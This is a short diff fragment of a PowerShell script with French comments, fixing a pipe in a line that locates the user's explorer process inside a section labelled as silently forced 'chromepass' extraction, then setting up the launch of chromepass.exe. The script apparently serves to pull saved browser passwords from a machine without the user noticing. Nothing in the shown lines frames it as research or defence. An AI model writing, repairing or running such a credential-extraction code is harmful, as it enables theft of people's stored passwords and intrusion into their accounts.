@@ -41,7 +41,7 @@ Start-Sleep -Seconds 3
 
 # --- EXTRACTION CHROMEPASS (MODE SILENCIEUX FORCÉ) ---
 Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
-$explorer = Get-Process -IncludeUserName \vert{} Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
+$explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
 
 if ($explorer) {$processInfo = New-Object System.Diagnostics.ProcessStartInfo
     $processInfo.FileName = "$basePath\chromepass.exe"
